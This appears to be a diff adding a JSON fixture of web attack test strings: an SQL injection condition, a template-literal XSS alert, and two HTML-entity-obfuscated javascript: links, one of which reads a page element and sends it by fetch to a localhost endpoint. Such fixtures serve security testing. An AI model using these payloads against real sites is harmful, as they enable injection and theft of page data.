@@ -1,0 +1,18 @@
+
+{
+	"test": "1+OR+0x50=0x50 //"
+}
+
+
+{
+	"test": "alert`'XSS'`"
+}
+
+{
+	"test": "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(2)>ClickMe</a>"
+}
+
+{
+	"test2": "<a href=j&#97v&#97script&#x3A;var&#32secret&#32=&#32document.getElementsByName('name')[0]&#46innerHTML;var&#32data&#32=&#32&#123body:secret,method:'POST'};fetch`http:\//localhost:3001/api/ping?secret=$&#123data}`>ClickMe</a>"
+}
+	
